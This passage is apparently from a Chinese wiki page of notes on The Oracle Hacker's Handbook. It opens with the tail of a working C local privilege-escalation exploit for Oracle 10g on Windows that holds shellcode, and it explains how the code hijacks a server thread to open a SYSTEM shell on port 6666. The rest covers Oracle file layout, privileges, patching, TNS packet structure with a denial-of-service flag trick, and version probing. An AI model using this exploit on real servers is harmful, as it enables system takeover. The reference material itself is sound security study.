class="line">&quot;\xD0\xFF\x55\x1C\x50\x50\xFF\x75\xD0\xFF\x55\x20\x99\x52\x68\x63&quot;</span><br><span class="line">&quot;\x6D\x64\x20\x54\x5F\x50\x50\x50\x52\x52\xB6\x01\x52\x6A\x0A\x99&quot;</span><br><span class="line">&quot;\x59\x52\xE2\xFD\x6A\x44\x54\x5E\x42\x54\x56\x51\x51\x51\x52\x51&quot;</span><br><span class="line">&quot;\x51\x57\x51\xFF\x55\x0C\xFF\x55\x08\x16\x9F\x9F\xB5\x72\x60\xA8&quot;</span><br><span class="line">&quot;\x6F\x80\x3B\x75\x49\x32\x4C\xE7\xDF&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int WriteShellCode(char *section);</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">      HANDLE hThread = NULL;</span><br><span class="line">      DWORD id = 0;</span><br><span class="line">      HMODULE k=NULL;</span><br><span class="line">      FARPROC mOpenThread = 0;</span><br><span class="line">      FARPROC ntq = 0;</span><br><span class="line">      FARPROC nts = 0;</span><br><span class="line">      unsigned char buff[1024]=&quot;&quot;;</span><br><span class="line">      unsigned int len = 0;</span><br><span class="line">      unsigned int res = 0;</span><br><span class="line">      unsigned int pid = 0;</span><br><span class="line">      unsigned char *p = 0;</span><br><span class="line">      unsigned int tid = 0;</span><br><span class="line">      CONTEXT ctx;</span><br><span class="line">      unsigned char *ptr=NULL;</span><br><span class="line"></span><br><span class="line">      if(argc != 3)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;\n\n\t*** own10g ***\n\n&quot;);</span><br><span class="line">            printf(&quot;\tC:\\&gt;%s pid section_name\n\n&quot;,argv[0]);</span><br><span class="line">            printf(&quot;\twhere pid is the process ID of Oracle\n&quot;);</span><br><span class="line">            printf(&quot;\tand section_name is *oraspawn_buffer_SID*\n&quot;);</span><br><span class="line">            printf(&quot;\tSID is the database SID - e.g. orcl\n\n&quot;);</span><br><span class="line">            printf(&quot;\tSee notes in source code for full details\n\n&quot;);</span><br><span class="line">            printf(&quot;\tDavid Litchfield\n\t(davidl@ngssoftware.com)&quot;);</span><br><span class="line">printf(&quot;\n\t3rd June 2005\n\n\n&quot;);</span><br><span class="line">            return 0;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      if(WriteShellCode(argv[2])==0)</span><br><span class="line">            return printf(&quot;Failed to write to section %s\n&quot;,argv[2]);</span><br><span class="line"></span><br><span class="line">      k = LoadLibrary(&quot;kernel32.dll&quot;);</span><br><span class="line">      if(!k)</span><br><span class="line">            return printf(&quot;Failed to load kernel32.dll&quot;);</span><br><span class="line">      mOpenThread = GetProcAddress(k,&quot; OpenThread&quot;);</span><br><span class="line">      if(!mOpenThread)</span><br><span class="line">            return printf(&quot;Failed to get address of OpenThread!&quot;);</span><br><span class="line">      k = LoadLibrary(&quot;ntdll.dll&quot;);</span><br><span class="line"></span><br><span class="line">      if(!k)</span><br><span class="line">            return printf(&quot;Failed to load ntdll.dll&quot;);</span><br><span class="line">      ntq = GetProcAddress(k,&quot; NtQueryInformationThread&quot;);</span><br><span class="line">      if(!ntq)</span><br><span class="line">            return printf(&quot;Failed&quot;);</span><br><span class="line">      nts = GetProcAddress(k,&quot; NtSetInformationThread&quot;);</span><br><span class="line">      if(!nts)</span><br><span class="line">            return printf(&quot;Failed&quot;);</span><br><span class="line"></span><br><span class="line">      tid = atoi(argv[1]);</span><br><span class="line"></span><br><span class="line">      while(id &lt; 0xFFFF)</span><br><span class="line">      &#123;</span><br><span class="line">            hThread = mOpenThread(THREAD_ALL_ACCESS,TRUE,id);</span><br><span class="line">            if(hThread)</span><br><span class="line">            &#123;</span><br><span class="line">                  res = ntq(hThread,0,buff,0x1C,&amp;len);</span><br><span class="line">                  if(res !=0xC0000003)</span><br><span class="line">                  &#123;</span><br><span class="line">                        p = &amp;buff[9];</span><br><span class="line">                        pid = (int) *p;</span><br><span class="line">                        pid = pid &lt;&lt; 8;</span><br><span class="line">                        p--;</span><br><span class="line">                        pid = pid + (int) *p;</span><br><span class="line"></span><br><span class="line">                        if(pid == tid)</span><br><span class="line">                        &#123;</span><br><span class="line">                              printf(&quot;%d\n&quot;,id);</span><br><span class="line">                              ctx.ContextFlags =</span><br><span class="line">CONTEXT_INTEGER|CONTEXT_CONTROL;</span><br><span class="line">                              if(GetThreadContext(hThread,&amp;ctx)==0)</span><br><span class="line">                                    return printf(&quot;Failed to get</span><br><span class="line">context&quot;);</span><br><span class="line">                              ptr = (unsigned char *)&amp;ctx;</span><br><span class="line">                              ptr = ptr + 184;</span><br><span class="line"></span><br><span class="line">            // This exploit assumes the base address of the</span><br><span class="line">            // section is at 0x044D0000. If it is not at this</span><br><span class="line">            // address on your system - change it.</span><br><span class="line"></span><br><span class="line">                              memmove(ptr,&quot;\x40\x01\x4D\x04&quot;,4);</span><br><span class="line">                              if(SetThreadContext(hThread,&amp;ctx)==0)</span><br><span class="line">                                    return</span><br><span class="line">printf(&quot;%d\n&quot;,GetLastError());</span><br><span class="line">                        &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            hThread = NULL;</span><br><span class="line">            id ++;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int WriteShellCode(char *section)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">      SIZE_T size = 0;</span><br><span class="line"></span><br><span class="line">      if(OpenTheSection(section,FILE_MAP_WRITE)==0)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;OpenTheSection: Section %s\tError:</span><br><span class="line">%d\n&quot;,section,GetLastError());</span><br><span class="line">            return 0;</span><br><span class="line">      &#125;</span><br><span class="line">      if(MapTheSection(FILE_MAP_WRITE)==0)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;MapTheSection: Section %s\tError:</span><br><span class="line">%d\n&quot;,section,GetLastError());</span><br><span class="line">            return 0;</span><br><span class="line">      &#125;</span><br><span class="line">      size = GetSizeOfSection();</span><br><span class="line">      if(size == 0)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;GetSizeOfSection: Section %s\tError:</span><br><span class="line">%d\n&quot;,section,GetLastError());</span><br><span class="line">            return 0;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      printf(&quot;Size of section %d\n&quot;,size);</span><br><span class="line"></span><br><span class="line">      if(size &lt; 0x141)</span><br><span class="line">            return 0;</span><br><span class="line"></span><br><span class="line">      size = size - 0x140;</span><br><span class="line"></span><br><span class="line">      if(size &lt; strlen(shellcode))</span><br><span class="line">            return 0;</span><br><span class="line"></span><br><span class="line">      p = p + 0x140;</span><br><span class="line"></span><br><span class="line">      memmove(p,shellcode,strlen(shellcode));</span><br><span class="line"></span><br><span class="line">      return 1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int OpenTheSection(unsigned char *section, DWORD perm)</span><br><span class="line">&#123;</span><br><span class="line">      SIZE_T size=0;</span><br><span class="line">      hSection = OpenFileMapping(perm, FALSE, section);</span><br><span class="line">      if(!hSection)</span><br><span class="line">            return 0;</span><br><span class="line">      else</span><br><span class="line">            return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int MapTheSection(unsigned int rw)</span><br><span class="line">&#123;</span><br><span class="line">      p = (char *)MapViewOfFile(hSection, rw, 0, 0, 0);</span><br><span class="line">      if(!p)</span><br><span class="line">            return 0;</span><br><span class="line">      return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SIZE_T GetSizeOfSection()</span><br><span class="line">&#123;</span><br><span class="line">      MEMORY_BASIC_INFORMATION mbi;</span><br><span class="line">      SIZE_T size=0;</span><br><span class="line">      if(!p)</span><br><span class="line">      &#123;</span><br><span class="line">            printf(&quot;Address not valid.\n&quot;);</span><br><span class="line">            return 0;</span><br><span class="line">      &#125;</span><br><span class="line">      ZeroMemory(&amp;mbi,sizeof(mbi));</span><br><span class="line">      size = VirtualQuery(p,&amp;mbi,sizeof(mbi));</span><br><span class="line">      if(size !=28)</span><br><span class="line">            return 0;</span><br><span class="line">      size = mbi.RegionSize;</span><br><span class="line">      printf(&quot;Size: %d\n&quot;,size);</span><br><span class="line">      return size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​        当本地用户尝试在Windows上连接到Oracle时，它将通过命名管道进行连接。 在主服务器进程中创建了四个线程来处理客户端和服务器之间的通信。 这四个线程具有一个自由访问控制列表（DACL），该列表授予用户打开该线程的权限。</p><p>​        在第4步中，通过尝试进行身份验证，我们在服务器进程中创建了这些线程。</p><p>​        在第5步中，我们运行此漏洞利用程序，这将在服务器进程中打开一个内存部分，并将此处的shellcode写入此处。本部分的地址为0x044D0000（但可能有所不同）。因为本节中的DACL允许每个人都写入该内存，所以我们可以这样做。此部分的名称为* oraspawn_buffer_orcl *，其中orcl是在第2步中获得的数据库SID。注意，我们将shellcode专门写入0x044D0140，即该部分中的0x140字节。我们这样做是为了防止在我们的第二次连接尝试中破坏我们的shellcode。除了将shellcode写入该部分外，我们还设置了线程的执行上下文，换句话说，我们将EIP设置为指向我们的shellcode。</p><p>​        在第6步中，我们重新激活睡眠线程并切换到我们的shellcode。</p><p>​        shellcode在TCP端口6666上生成一个shell，在第7步中我们将其远程登录到该shell。通过运行whoami，我们将以系统特权运行Shell。</p><h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><p>​        了解文件系统上的Oracle结构非常有用。在后面的章节中，我们将通过直接访问Oracle文件来绕过数据库强制的访问控制，因此本节介绍了基本布局。安装Oracle的基本目录称为Oracle Home。为了使大多数Oracle实用程序都能正常工作，必须将一个环境变量（称为ORACLE_HOME）设置为此目录。</p><p>​        大多数Oracle可执行文件和动态链接库都位于 bin\oracle.exe，目录中。因此，$ORACLE_HOME/bin应该在PATH环境变量中；否则，该实用程序将再次无法使用。</p><p>​        数据逻辑上存储在表空间中，物理上存储在数据文件中，通常以.dbf为文件扩展名。通常，数据文件位于$</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ORACLE_HOME/oradata/SID</span><br></pre></td></tr></table></figure><p>​        目录中，其中SID是数据库SID。这些数据文件具有简单的二进制结构。 </p><p>​        Oracle 10g的文件头可以描述如下：字节2表示文件类型-0xA2似乎表示普通数据文件，0xC2是控制文件，0x22是重做日志文件。 0x14至0x17处的DWORD（4个字节）指示文件中每个数据块的大小，0x18至0x1B处的DWORD提供文件中数据块的数目。字节0x1C至0x1F是“魔术”键-始终设置为0x7D7C7B7A。文件头的大小与其他每个块的大小相同，如0x14到0x17，如果它是0x00002000，则将在文件中找到第一个数据块0x00002000字节。</p><p>​        每个数据块在字节block_base + 04和block_base + 05处包含其块号，以及从字节block_base + 0x18到block_base + 0x1B的服务器版本。第一个数据块是特殊的，它包含有关数据文件来自的服务器以及文件本身的信息。例如，数据库的SID可以在block_base + 0x20处找到，表空间名称在block_base + 0x52处，并且此名称的长度在block_base + 0x50处的两个字节处。</p><p>​        前面提到了另外两种重要的文件类型：控制文件和重做日志。控制文件包含有关数据库服务器物理结构的重要信息。重做日志跟踪对数据文件所做的更改，它们充当服务器与数据文件之间的桥梁：在对数据文件进行任何更改之前，它们首先被写入重做日志。因此，如果数据文件出了问题，则可以从这些重做日志中的信息中恢复状态。检查这些日志文件通常可以向攻击者揭示有用的信息。例如，如果用户使用通过密码语法标识的ALTER USER名称来更改其密码，那么明文密码将被写入Oracle 9及更早版本的重做日志中。</p><p>​        数据库初始化配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">init &lt;SID&gt; .ora或spfile &lt;SID&gt; .ora</span><br></pre></td></tr></table></figure><p>​        可以位于Windows上的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">％ORACLE_HOME％\database\</span><br></pre></td></tr></table></figure><p>​        和Linux平台上的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ORACLE_HOME/dbs</span><br></pre></td></tr></table></figure><h3 id="网络结构"><a href="#网络结构" class="headerlink" title="网络结构"></a>网络结构</h3><p>​        可以将Oracle配置为侦听TCP套接字（带有或不带有SSL，IPC，SPX和命名管道）。 对于在Windows平台上查看Oracle的用户，请记住，可以通过网络在TCP端口139和445上访问命名管道。（这意味着，即使已将TNS侦听器配置为不在TCP套接字上侦听，仍然可以通过命名管道，远程访问它。 就TCP而言，通常默认在端口1521或1526上侦听服务器。 </p><h3 id="数据库对象"><a href="#数据库对象" class="headerlink" title="数据库对象"></a>数据库对象</h3><p>​        Oracle支持通常会在数据库服务器中期望的典型数据库对象，例如表和视图。 我们稍后将特别注意的其他对象包括触发器，包，过程和函数。 可以通过执行以下SQL列出数据库中存在的所有对象类型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select distinct object_type from all_objects order by 1;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/1.png"></p><p>​        在默认安装的Oracle 11g中，列出了43种以上的对象类型。</p><h3 id="用户和角色"><a href="#用户和角色" class="headerlink" title="用户和角色"></a>用户和角色</h3><p>​        Oracle要求使用用户ID和密码对用户进行身份验证。 Oracle以其使用默认密码创建的默认帐户数量而闻名。 如今，大多数默认帐户通常都已锁定。</p><p>​         Oracle数据库服务器中最强大的用户是SYS，其次是SYSTEM用户。 根据已安装的其他组件，其他功能强大的用户包括但不限于CTXSYS，MDSYS，WKSYS和SYSMAN。 </p><p>​        模式是给定用户拥有的对象的集合。 例如，可以说SCOTT拥有的所有表，视图和过程都存在于SCOTT模式中。 还有一个称为PUBLIC的特殊用户，与PUBLIC用户相关的任何事情都适用于数据库中的每个用户。</p><h3 id="特权"><a href="#特权" class="headerlink" title="特权"></a>特权</h3><p>​        Oracle中的访问控制由特权分配控制。 有两种特权：对象特权（object）和系统特权（system）。 对象特权是指可以对数据库对象（例如表，视图和过程）操作，而系统特权是指用户可以对数据库执行的操作（例如创建和删除）。 特权可以直接分配给用户或角色。 </p><p>​        对象特权包括以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ALTER</span><br><span class="line">DEBUG</span><br><span class="line">DELETE</span><br><span class="line">DEQUEUE</span><br><span class="line">EXECUTE</span><br><span class="line">FLASHBACK</span><br><span class="line">INDEX</span><br><span class="line">INSERT</span><br><span class="line">ON COMMIT REFRESH</span><br><span class="line">QUERY REWRITE</span><br><span class="line">READ</span><br><span class="line">REFERENCES</span><br><span class="line">SELECT</span><br><span class="line">UNDER</span><br><span class="line">UPDATE</span><br><span class="line">WRITE</span><br></pre></td></tr></table></figure><p>​        有超过200个系统特权。 通过执行以下操作，可以获得系统特权的完整列表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select name from system_privilege_map;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/2.png"></p><p>​        此外，还有一些系统特权组，例如ALTER ANY，CREATE ANY，EXECUTE ANY，ANALYZE，AUDIT，DEBUG，DELETE ANY和DROP ANY。 例如，EXECUTE ANY包括以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">EXECUTE ANY CLASS</span><br><span class="line">EXECUTE ANY EVALUATION CONTEXT</span><br><span class="line">EXECUTE ANY INDEXTYPE</span><br><span class="line">EXECUTE ANY LIBRARY</span><br><span class="line">EXECUTE ANY OPERATOR</span><br><span class="line">EXECUTE ANY PROCEDURE</span><br><span class="line">EXECUTE ANY PROGRAM</span><br><span class="line">EXECUTE ANY RULE</span><br><span class="line">EXECUTE ANY RULE SET</span><br><span class="line">EXECUTE ANY TYPE</span><br></pre></td></tr></table></figure><p>​        要查明用户具有哪些特权，可以查询DBA_TAB_PRIVS和DBA_SYS_PRIVS视图。 </p><h3 id="Oracle-补丁"><a href="#Oracle-补丁" class="headerlink" title="Oracle 补丁"></a>Oracle 补丁</h3><p>​        2004年8月下旬，Oracle发布了期待已久的补丁集。此补丁集修复了安全研究人员（例如作者Esteban Martinez Fayo，Pete Finnigan，Jonathan Gennick，Alexander Kornbrust Stephen Kost，Matt Moore，Andy Rees和Christian Schaller）报告的数百个漏洞。它被称为Alert 68，它预示了与Oracle不同的补丁和补丁发行方法的到来。从那时起，Oracle承诺每三个月发布一次关键补丁更新（CPU）。 CPU往往包含大量的修复程序，并且只有一次（在撰写本文时）没有多次发布过CPU-即2006年7月的CPU。由于这种频率和数量，通常查找具有错误，过时补丁的服务器。结果，管理员认为实际上他们没有受到保护。甲骨文对此公开和私下提出了很多批评。</p><p>​        用于在除8.1.7.4以外的所有Oracle版本上安装Oracle补丁的工具称为“ opatch”。 opatch实用程序读取随补丁一起提供的名为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$PATCH/etc/config/actions</span><br></pre></td></tr></table></figure><p>​        的文件，该文件描述了安装操作的列表，例如要将哪些文件复制到何处。工具运行后，将更新一个名为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ORACLE_HOME/inventory/ContentsXML/comps.xml</span><br></pre></td></tr></table></figure><p>​        的文件。除其他事项外，该文件还包含补丁集已修复的错误号的列表。不建议您依靠此文件中的信息来确定服务器是否容易受到给定漏洞的影响，因为opatch可能会失败，并且由于错误导致comps.xml中的错误导致频繁地重新发布补丁程序文件。这可能会产生误导。</p><p>​        确定服务器是否易受攻击的唯一肯定方法是确认服务器上是否存在易受攻击的代码。您可以通过对所有PLSQL代码进行校验和并将生成的校验和与有缺陷的软件包的已知列表进行比较来做到这一点。使用NGSSoftware的NGSSQuirreL，可以使用DBMS_UTILITY.GET_HASH_VALUE函数。这里有一个简短的解释，因此您可以根据需要自己实现。给定PLSQL包的文本跨DBA_SOURCE视图中的多行存储。对于包的每一行文本，都可以使用DBMS_UTILITY.GET_HASH_VALUE函数生成一个哈希。然后，您将获得每一行的平均值至小数点后30位：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">set numwidth 50</span><br><span class="line"></span><br><span class="line">SELECT</span><br><span class="line">AVG(DBMS_UTILITY.GET_HASH_VALUE(TEXT,1000000000,POWER(2,30)))</span><br><span class="line">AS CHECKSUM FROM DBA_SOURCE</span><br><span class="line">WHERE OWNER=&#x27;SYS&#x27; AND NAME=&#x27;TEST_F&#x27;</span><br><span class="line">/</span><br></pre></td></tr></table></figure><p><img src="/3.PNG"></p><h2 id="Oracle网络体系结构"><a href="#Oracle网络体系结构" class="headerlink" title="Oracle网络体系结构"></a>Oracle网络体系结构</h2><p>​        Oracle网络体系结构包含许多组件，所有组件都与OSI网络模型完全对应。这种体系结构使Oracle客户端和服务器应用程序可以通过TCP/IP等协议进行通信。在应用程序（客户端上的Oracle Call Interface或OCI和服务器上的Oracle Program Interface或OPI）与网络层之间进行接口连接的会话协议称为Net8（Net9），而在SQL * Net之前。</p><p>​        在OCI/OPI和Net8层之间是一个称为“双任务通用”（TTC）的表示协议，该协议负责客户端和服务器之间的字符集和数据类型转换差异。 Net8会话协议有三个组件：网络基础设施、路由/命名/验证和TNS。受支持的传输协议包括TCP / IP（带有或不带有TCP），命名管道和套接字直接协议（SDP），可通过Infiband高速网络进行通信。所有这些的基础是透明网络基板协议，也称为TNS。 TNS的任务是选择Oracle协议适配器，将通信包装在支持的传输协议中。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/4.png"></p><h3 id="TNS协议"><a href="#TNS协议" class="headerlink" title="TNS协议"></a>TNS协议</h3><h4 id="TNS协议头部"><a href="#TNS协议头部" class="headerlink" title="TNS协议头部"></a>TNS协议头部</h4><p>​        每个TNS数据包都有一个八字节的标头。 头部的前两个字节（WORD）用于数据包长度-包括标头大小。 像所有值一样，大小为big-endian。 如果校验和已完成，则下一个WORD用于数据包校验和，并且此WORD的值为0x0000。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0      8       16            31</span><br><span class="line">+--------------+--------------+</span><br><span class="line">| Packet Length| Packet Chksm | </span><br><span class="line">+------+-------+--------------+   8 byte header</span><br><span class="line">| Type | Rsrvd | Header Chksm | </span><br><span class="line">+------+-------+--------------+</span><br><span class="line">|        P A Y L O A D        |</span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure><p>​        通用Header8个字节：</p><table><thead><tr><th>Length</th><th>2</th><th>包的长度，包括通用包头</th></tr></thead><tbody><tr><td>Packet check sum</td><td>2</td><td>包的校验和</td></tr><tr><td>Type</td><td>1</td><td>TNS类型</td></tr><tr><td>Flag</td><td>1</td><td>状态</td></tr><tr><td>Header check sum</td><td>2</td><td>通用头的校验和</td></tr></tbody></table><p>​        数据包类型（Type）例如，最常见的如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Connect packet      Type 1</span><br><span class="line">Accept packet       Type 2</span><br><span class="line">Ack packet          Type 3</span><br><span class="line">Refuse packet       Type 4</span><br><span class="line">Redirect packet     Type 5</span><br><span class="line">Data packet       Type 6</span><br><span class="line">NULL packet         Type 7</span><br><span class="line">Abort packet      Type 9</span><br><span class="line">Resend packet      Type 11</span><br><span class="line">Marker packet      Type 12</span><br><span class="line">Attention packet    Type 13</span><br><span class="line">Control packet      Type 14</span><br></pre></td></tr></table></figure><p>​        连接到Oracle时，客户端在TNS级别向服务器发送一个Connect数据包（类型1），指定他们希望访问的服务名称。如果侦听器知道这种服务，则可能发生以下两种情况之一：TNS侦听器可以发送一个Accept数据包（类型2），或者可以使用重定向数据包将客户端重定向到另一个端口（类型5）。如果出现前一个选项，则客户端将尝试进行身份验证。如果发生后者，则客户端将Connect数据包发送到已将其重定向到的端口，并请求访问该服务。如果一切顺利，则服务器将发出“接受”数据包并进行身份验证。所有身份验证包都是（类型6）的数据包。</p><p>​        如果侦听器不知道客户端正在请求访问的服务，则它将发出“Refuse”数据包（类型4）。通过身份验证后，查询和结果数据包就是“Data”数据包（类型6）。通常，会看到一个类型为12（0x0C）的数据包-这是一个标记数据包，用于中断。</p><p>​        例如，如果服务器希望客户端停止发送数据，则它将向客户端发送一个标记数据包。</p><p>​        继续TNS标头的详细信息，下一个字节是标头标志。通常，这些标志是未使用的，但是10g客户端可以将该值设置为0x04。最后两个字节构成标题校验和的WORD-默认情况下不使用，设置为0x0000：</p><p>​        在深入研究数据包之前，先查看一下“拒绝数据包”（类型4）会很有用。“拒绝数据包”表示某种错误。例如，带有“无效的用户名/密码”的登录被拒绝错误-ORA-01017 。 由于这些错误，第54个字节指示问题。 3是无效密码； 2表示没有这样的用户。 显然，可以从“拒绝”数据包中获得潜在有用的信息。</p><h4 id="TNS协议包体"><a href="#TNS协议包体" class="headerlink" title="TNS协议包体"></a>TNS协议包体</h4><p>​        网络上看到的大多数数据包都是数据包（类型6）。 对于数据包，TNS标头后的WORD用于数据标志。 如果数据包是断开连接数据包，则此WORD设置为0x0040，否则，为0x0000。</p><p>​        注意：当服务器处理设置了数据标志的第二位但未设置第一个（最低有效）位的数据包（类型6）（例如，数字2、6、10， 14，依此类推）。 当服务器接收到这样的数据包时，它会陷入无限循环，从而占用所有可用的CPU处理时间。</p><p>​        数据标志后的下一个字节（字节11）确定数据包中的内容：</p><p>​        0x01表示协议协商。 在此，客户端向服务器发送可接受的协议版本-分别为6、5、4、3、2、1和0。服务器将以通用版本（例如6或5）进行答复，但也会发送 信息，例如它使用的字符集，集合中有多少个字符，版本字符串和服务器标志。</p><p>​        0x02表示数据类型表示形式的交换。</p><p>​        0x03表示两任务界面（TTI）功能调用。 下表列出了一些功能：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">0x02      Open</span><br><span class="line">0x03      Query</span><br><span class="line">0x04      Execute</span><br><span class="line">0x05      Fetch</span><br><span class="line">0x08      Close</span><br><span class="line">0x09      Disconnect/logoff</span><br><span class="line">0x0C      AutoCommit ON</span><br><span class="line">0x0D      AutoCommit OFF</span><br><span class="line">0x0E      Commit</span><br><span class="line">0x0F      Rollback</span><br><span class="line">0x14      Cancel</span><br><span class="line">0x2B      Describe</span><br><span class="line">0x30      Startup</span><br><span class="line">0x31      Shutdown</span><br><span class="line">0x3B      Version</span><br><span class="line">0x43      K2 Transactions</span><br><span class="line">0x47      Query</span><br><span class="line">0x4A      OSQL7</span><br><span class="line">0x5C      OKOD</span><br><span class="line">0x5E      Query</span><br><span class="line">0x60      LOB Operations</span><br><span class="line">0x62      ODNY</span><br><span class="line">0x67      Transaction - end</span><br><span class="line">0x68      Transaction - begin</span><br><span class="line">0x69      OCCA</span><br><span class="line">0x6D      Startup</span><br><span class="line">0x51      Logon (present password)</span><br><span class="line">0x52      Logon (present username)</span><br><span class="line">0x73      Logon (present password - send AUTH_PASSWORD)</span><br><span class="line">0x76      Logon (present username - request AUTH_SESSKEY)</span><br><span class="line">0x77      Describe</span><br><span class="line">0x7F      OOTCM</span><br><span class="line">0x8B      OKPFC</span><br></pre></td></tr></table></figure><p>​        其中的一些可能在身份验证之前被调用，例如，版本（0x3B）TTI函数：</p><p>​        0x08表示“确定”，从服务器发送来响应客户端。</p><p>​        0x11表示扩展的TTI功能。 这些是在更高版本的Oracle中引入的，因此为了向后兼容，请勿使用0x03。以下是一些功能代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x6b      Switch or Detach session</span><br><span class="line">0x78      Close</span><br><span class="line">0x87      OSCID</span><br><span class="line">0x9A      OKEYVAL</span><br></pre></td></tr></table></figure><p>​        0x20，调用外部过程和服务注册。</p><p>​        0x44，调用外部过程和服务注册。</p><p>​        除了检查Oracle JDBC客户端（classes12.zip）之外，获取TNS协议的最佳方法是使用网络嗅探器从网络上捕获一些数据包，然后查看发生了什么。</p><h3 id="获取Oracle版本"><a href="#获取Oracle版本" class="headerlink" title="获取Oracle版本"></a>获取Oracle版本</h3><p>​        有许多方法可以在身份验证之前，获取Oracle版本号。 </p><h4 id="利用侦听器版本和状态命令"><a href="#利用侦听器版本和状态命令" class="headerlink" title="利用侦听器版本和状态命令"></a>利用侦听器版本和状态命令</h4><p>​        侦听器控制实用程序同时具有版本命令和状态命令。 它们都可以从客户端发出，以请求侦听器的版本号。 还显示了有关运行侦听器的操作系统的详细信息。 请注意，尽管Oracle禁止状态命令远程处理10g，但版本命令仍然有效。 这是版本命令的输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span 